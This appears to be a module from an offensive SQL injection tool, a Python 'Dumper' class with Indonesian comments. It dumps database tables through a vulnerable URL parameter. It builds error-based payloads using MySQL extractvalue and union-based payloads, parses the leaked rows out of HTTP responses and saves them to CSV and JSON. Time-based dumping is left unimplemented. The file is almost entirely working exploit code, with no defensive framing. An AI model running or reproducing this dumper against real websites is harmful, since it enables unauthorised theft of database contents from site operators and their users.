import re
import time
from lib.requester import send_request, build_url_with_param
from lib.savers import save_csv, save_json

class Dumper:
    def __init__(self, url, vuln_param, technique, dbms=None, prefix_suffix_getter=None):
        self.url = url
        self.param = vuln_param
        self.technique = technique
        self.dbms = dbms
        # Fungsi untuk mendapatkan prefix/suffix dari enumerator (jika ada)
        self._get_prefix_suffix = prefix_suffix_getter
        self._prefix = None
        self._suffix = None

    def _build_payload(self, injection):
        """Bangun payload dengan prefix/suffix yang benar (mirip enumerator)."""
        if self._get_prefix_suffix:
            prefix, suffix = self._get_prefix_suffix()
            return f"{prefix}({injection}){suffix}"
        else:
            # Fallback default
            return f"1' AND ({injection})-- -"

    def _error_extract_rows(self, db_name, table_name, columns):
        """Error-based dump (MySQL) – mengambil baris per baris dengan extractvalue."""
        if self.dbms != 'MySQL':
            return []
        data = []
        # Jika columns = ['*'], kita tidak bisa menggunakan CONCAT_WITH separator yang baik
        # Tapi kita asumsikan columns sudah diberikan dengan benar
        col_concat = "CONCAT_WS('|', " + ', '.join(columns) + ")" if columns != ['*'] else "*"
        for i in range(100):
            query = f"SELECT {col_concat} FROM {db_name}.{table_name} LIMIT {i},1"
            injection = f"extractvalue(1,concat(0x7e,({query})))"
            payload = self._build_payload(injection)
            url = build_url_with_param(self.url, self.param, payload)
            resp = send_request(url)
            if resp and 'XPATH syntax error' in resp.text:
                match = re.search(r"~([^~]+)", resp.text)
                if match:
                    row_str = match.group(1)
                    values = row_str.split('|')
                    if len(values) == len(columns):
                        data.append(dict(zip(columns, values)))
                    else:
                        data.append({'raw': row_str})
                else:
                    break
            else:
                break
            time.sleep(0.2)
        return data

    def _union_dump(self, db_name, table_name, columns):
        """Union-based dump (lebih cepat)."""
        col_str = ', '.join(columns) if columns != ['*'] else '*'
        data = []
        offset = 0
        limit = 50
        while True:
            query = f"SELECT {col_str} FROM {db_name}.{table_name} LIMIT {offset}, {limit}"
            injection = query
            payload = self._build_payload(injection)
            url = build_url_with_param(self.url, self.param, payload)
            resp = send_request(url)
            if not resp or 'error' in resp.text.lower():
                break
            # Parsing sederhana: ambil teks di antara tag atau spasi
            text = re.sub(r'<[^>]+>', ' ', resp.text)
            parts = text.split()
            if len(parts) >= len(columns):
                rows = [parts[i:i+len(columns)] for i in range(0, len(parts), len(columns))]
                for row in rows:
                    if len(row) == len(columns):
                        data.append(dict(zip(columns, row)))
            if len(parts) < limit * len(columns):
                break
            offset += limit
        return data

    def _time_blind_dump(self, db_name, table_name, columns):
        """Time-based blind dump (sangat lambat, hanya untuk fallback)."""
        # Tidak diimplementasikan secara penuh di sini karena kompleks
        print("[!] Time-based dump belum diimplementasikan sepenuhnya.")
        return []

    def dump_table(self, db_name, table_name, columns=None):
        if columns is None or columns == ['*']:
            print("[!] Columns tidak dispesifikasikan. Coba gunakan enumerator terlebih dahulu.")
            return []
        if self.technique == 'union':
            data = self._union_dump(db_name, table_name, columns)
        elif self.technique == 'error' and self.dbms == 'MySQL':
            data = self._error_extract_rows(db_name, table_name, columns)
        elif self.technique == 'time':
            data = self._time_blind_dump(db_name, table_name, columns)
        else:
            print(f"[!] Teknik dump '{self.technique}' tidak didukung.")
            return []
        if data:
            filename = f"{db_name}_{table_name}"
            save_csv(data, f"{filename}.csv")
            save_json(data, f"{filename}.json")
            print(f"[+] Berhasil dump {len(data)} baris dari '{table_name}'")
        else:
            print(f"[-] Tabel '{table_name}' kosong atau tidak bisa di-dump dengan teknik {self.technique}.")
        return data